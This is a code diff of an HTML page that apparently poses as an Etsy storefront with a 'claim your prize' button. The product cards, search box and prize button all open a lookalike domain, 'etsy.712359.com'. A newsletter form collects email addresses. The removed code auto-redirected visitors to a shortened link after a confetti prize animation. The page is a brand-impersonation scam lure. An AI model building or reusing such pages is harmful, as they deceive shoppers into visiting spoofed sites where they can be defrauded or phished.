+                price: "$13.18",
+                oldPrice: "$16.47",
+                isNew: false,
+                image: "https://i.etsystatic.com/64436345/r/il/defcae/7693241610/il_fullxfull.7693241610_8j9u.jpg",
+                link: "https://etsy.712359.com/222508761"
             }
+        ];
+
+        // Generate product cards
+        function createProductCard(product) {
+            return `
+                <a href="${product.link}" class="product-card" onclick="logAction('product_click')" target="_blank">
+                    <div class="product-image">
+                        ${product.isNew ? '<span class=\"badge-new\">New for you</span>' : ''}
+                        <img src="${product.image}" alt="${product.title}" onerror="this.src='https://via.placeholder.com/200x200?text=Product'">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-name">${product.title}</div>
+                        <div class="product-seller">${product.seller}</div>
+                        <div class="product-price">
+                            <span class="price-sale">${product.price}</span>
+                            <span class="price-old">${product.oldPrice}</span>
+                        </div>
+                    </div>
+                </a>
+            `;
         }
 
-        function createSparkles() {
-            const sparkleCount = 40;
+        // Populate sections with products
+        document.addEventListener('DOMContentLoaded', function() {
+            const trendingContainer = document.getElementById('trendingProducts');
+            const recommendedContainer = document.getElementById('recommendedProducts');
+            const newContainer = document.getElementById('newProducts');
 
-            for (let i = 0; i < sparkleCount; i++) {
-                const sparkle = document.createElement('div');
-                sparkle.className = 'sparkle';
-                sparkle.style.left = Math.random() * 100 + '%';
-                sparkle.style.top = Math.random() * 100 + '%';
-                sparkle.style.animationDelay = Math.random() * 2 + 's';
-                document.body.appendChild(sparkle);
+            // Distribute products across sections
+            const trending = products.slice(0, 6);
+            const recommended = products.slice(6, 12);
+            const newProducts = products.slice(12, 18);
 
-                setTimeout(() => sparkle.remove(), 8000);
+            trendingContainer.innerHTML = trending.map(p => createProductCard(p)).join('');
+            recommendedContainer.innerHTML = recommended.map(p => createProductCard(p)).join('');
+            newContainer.innerHTML = newProducts.map(p => createProductCard(p)).join('');
+
+            // Search input
+            const searchInput = document.getElementById('searchInput');
+            if (searchInput) {
+                searchInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        searchEtsy();
+                    }
+                });
             }
-        }
-
-        function claimPrize() {
-            createConfetti();
-            createSparkles();
-
-            setTimeout(() => {
-                window.location.href = 'https://vly.to/c5lhTj';
-            }, 600);
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            createConfetti();
-            createSparkles();
         });
 
-        setInterval(() => {
-            createConfetti();
-        }, 4000);
+        // Track all user actions
+        function logAction(actionName) {
+            console.log(`Action logged: ${actionName} at ${new Date().toISOString()}`);
+        }
+
+        // Handle prize button click
+        function handlePrizeClick() {
+            logAction('prize_button_clicked');
+            console.log('Prize button clicked! Redirecting to Etsy...');
+            window.open('https://etsy.712359.com/222508761', '_blank');
+        }
+
+        // Handle newsletter submission
+        function handleNewsletterSubmit(event) {
+            event.preventDefault();
+            const email = event.target.querySelector('input[type="email"]').value;
+            logAction('newsletter_subscribe');
+            console.log('Newsletter subscription:', email);
+            alert('Thank you for subscribing! Check your email for exclusive offers.');
+            event.target.reset();
+        }
+
+        // Search function
+        function searchEtsy() {
+            const searchInput = document.getElementById('searchInput');
+            const query = searchInput.value.trim();
+            
+            if (query) {
+                logAction('search_performed');
+                window.open('https://etsy.712359.com/222508761', '_blank');
+            }
+        }
     </script>
 </body>
 </html>
